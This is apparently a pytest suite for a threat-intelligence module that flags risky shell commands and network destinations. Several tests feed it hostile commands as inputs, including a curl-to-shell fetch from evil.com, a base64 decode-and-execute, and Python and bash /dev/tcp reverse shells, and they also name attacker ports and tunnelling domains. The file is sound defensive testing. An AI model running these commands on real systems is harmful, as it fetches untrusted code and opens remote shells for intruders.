"""
Tests for threat_intel.py - Threat pattern detection.
"""
import pytest
from pathlib import Path

import sys
sys.path.insert(0, str(Path(__file__).parent.parent))

from threat_intel import ThreatIntel, ThreatPattern, ThreatSeverity, get_threat_intel


class TestThreatIntel:
    """Tests for ThreatIntel class."""

    @pytest.fixture
    def intel(self):
        """Get fresh threat intel instance."""
        return ThreatIntel()

    # ==================== Command Analysis ====================

    def test_detect_pipe_to_shell(self, intel):
        """Test detection of curl/wget piped to shell."""
        threats = intel.analyze_command('curl https://evil.com/script.sh | sh')
        assert len(threats) > 0
        assert threats[0]['severity'] == 'critical'
        assert 'pipe' in threats[0]['name'].lower() or 'shell' in threats[0]['name'].lower()

    def test_detect_wget_pipe_to_bash(self, intel):
        """Test detection of wget piped to bash."""
        threats = intel.analyze_command('wget -O - https://example.com/install | bash')
        assert len(threats) > 0
        assert threats[0]['severity'] == 'critical'

    def test_detect_base64_decode_execute(self, intel):
        """Test detection of base64 decoded payload execution."""
        threats = intel.analyze_command('echo SGVsbG8= | base64 -d | sh')
        assert len(threats) > 0
        assert any(t['severity'] == 'high' for t in threats)

    def test_detect_python_reverse_shell(self, intel):
        """Test detection of Python reverse shell."""
        cmd = "python -c 'import socket;s=socket.socket();s.connect((\"10.0.0.1\",4444))'"
        threats = intel.analyze_command(cmd)
        assert len(threats) > 0
        assert any(t['severity'] == 'critical' for t in threats)

    def test_detect_bash_reverse_shell(self, intel):
        """Test detection of bash /dev/tcp reverse shell."""
        cmd = 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
        threats = intel.analyze_command(cmd)
        assert len(threats) > 0
        assert any(t['severity'] == 'critical' for t in threats)

    def test_detect_netcat_listener(self, intel):
        """Test detection of netcat listener."""
        threats = intel.analyze_command('nc -lvp 4444')
        assert len(threats) > 0

    def test_detect_crontab_modification(self, intel):
        """Test detection of crontab modification."""
        threats = intel.analyze_command('crontab -e')
        assert len(threats) > 0
        assert any('persistence' in t['category'] for t in threats)

    def test_safe_command_no_threat(self, intel):
        """Test safe commands don't trigger threats."""
        safe_commands = [
            'ls -la',
            'git status',
            'npm install lodash',
            'python -m pytest',
            'docker ps',
            'cat README.md',
        ]
        
        for cmd in safe_commands:
            threats = intel.analyze_command(cmd)
            assert len(threats) == 0, f"False positive on: {cmd}"

    # ==================== Network Analysis ====================

    def test_detect_suspicious_port_4444(self, intel):
        """Test detection of Metasploit default port."""
        threats = intel.analyze_network('192.168.1.100', 4444)
        assert len(threats) > 0
        assert any(t['severity'] == 'critical' for t in threats)

    def test_detect_suspicious_port_31337(self, intel):
        """Test detection of elite/Back Orifice port."""
        threats = intel.analyze_network('10.0.0.1', 31337)
        assert len(threats) > 0
        assert any(t['severity'] == 'critical' for t in threats)

    def test_detect_tor_port(self, intel):
        """Test detection of Tor SOCKS proxy port."""
        threats = intel.analyze_network('127.0.0.1', 9050)
        assert len(threats) > 0
        assert any(t['severity'] == 'high' for t in threats)

    def test_detect_pastebin_domain(self, intel):
        """Test detection of pastebin.com."""
        threats = intel.analyze_network('', 443, 'pastebin.com')
        assert len(threats) > 0

    def test_detect_ngrok_domain(self, intel):
        """Test detection of ngrok tunneling."""
        threats = intel.analyze_network('', 443, 'abc123.ngrok.io')
        assert len(threats) > 0

    def test_detect_suspicious_tld(self, intel):
        """Test detection of suspicious TLDs."""
        threats = intel.analyze_network('', 80, 'evil.tk')
        assert len(threats) > 0

    def test_safe_port_80(self, intel):
        """Test port 80 doesn't trigger by itself."""
        threats = intel.analyze_network('93.184.216.34', 80, 'example.com')
        # Port 80 alone shouldn't trigger, unless domain is suspicious
        suspicious_threats = [t for t in threats if t['severity'] in ['high', 'critical']]
        assert len(suspicious_threats) == 0

    def test_safe_port_443(self, intel):
        """Test port 443 doesn't trigger for normal domains."""
        threats = intel.analyze_network('', 443, 'github.com')
        assert len(threats) == 0

    # ==================== Connection Analysis ====================

    def test_analyze_connection_enriches_data(self, intel):
        """Test analyze_connection enriches connection data."""
        conn = {
            'remote': '10.0.0.1:4444',
            'process': 'nc',
            'pid': 1234
        }
        
        result = intel.analyze_connection(conn)
        
        assert 'threats' in result
        assert 'is_suspicious' in result
        assert result['is_suspicious'] is True
        assert result['process'] == 'nc'  # Original data preserved

    def test_analyze_connection_safe(self, intel):
        """Test analyze_connection for safe connection."""
        conn = {
            'remote': '93.184.216.34:80',
            'hostname': 'example.com',
            'process': 'curl'
        }
        
        result = intel.analyze_connection(conn)
        
        assert result['is_suspicious'] is False
        assert len(result['threats']) == 0

    # ==================== Pattern Metadata ====================

    def test_patterns_have_ids(self, intel):
        """Test all patterns have unique IDs."""
        patterns = intel.get_all_patterns()
        ids = [p['id'] for p in patterns]
        
        assert len(ids) == len(set(ids)), "Pattern IDs should be unique"

    def test_patterns_have_mitre_ids(self, intel):
        """Test patterns include MITRE ATT&CK IDs."""
        patterns = intel.get_all_patterns()
        
        # At least some patterns should have MITRE IDs
        patterns_with_mitre = [p for p in patterns if p.get('mitre_id')]
        assert len(patterns_with_mitre) > 0

    def test_patterns_have_categories(self, intel):
        """Test patterns are categorized."""
        patterns = intel.get_all_patterns()
        categories = set(p['category'] for p in patterns)
        
        # Should have multiple categories
        assert len(categories) >= 2
        
        # Common categories should exist
        assert 'execution' in categories

    def test_patterns_have_descriptions(self, intel):
        """Test all patterns have descriptions."""
        patterns = intel.get_all_patterns()
        
        for p in patterns:
            assert p.get('description'), f"Pattern {p['id']} missing description"

    # ==================== Severity Levels ====================

    def test_severity_enum(self):
        """Test ThreatSeverity enum values."""
        assert ThreatSeverity.LOW.value == "low"
        assert ThreatSeverity.MEDIUM.value == "medium"
        assert ThreatSeverity.HIGH.value == "high"
        assert ThreatSeverity.CRITICAL.value == "critical"

    # ==================== Singleton ====================

    def test_get_threat_intel_singleton(self):
        """Test get_threat_intel returns same instance."""
        intel1 = get_threat_intel()
        intel2 = get_threat_intel()
        assert intel1 is intel2


class TestThreatPattern:
    """Tests for ThreatPattern dataclass."""

    def test_create_pattern(self):
        """Test creating a ThreatPattern."""
        pattern = ThreatPattern(
            id="TEST-001",
            name="Test Pattern",
            description="A test pattern",
            severity=ThreatSeverity.HIGH,
            pattern=r"test.*pattern",
            category="test"
        )
        
        assert pattern.id == "TEST-001"
        assert pattern.severity == ThreatSeverity.HIGH
        assert pattern.mitre_id is None  # Optional field

    def test_pattern_with_mitre_id(self):
        """Test ThreatPattern with MITRE ID."""
        pattern = ThreatPattern(
            id="TEST-002",
            name="Test Pattern",
            description="A test pattern",
            severity=ThreatSeverity.CRITICAL,
            pattern=r"test",
            category="test",
            mitre_id="T1059"
        )
        
        assert pattern.mitre_id == "T1059"
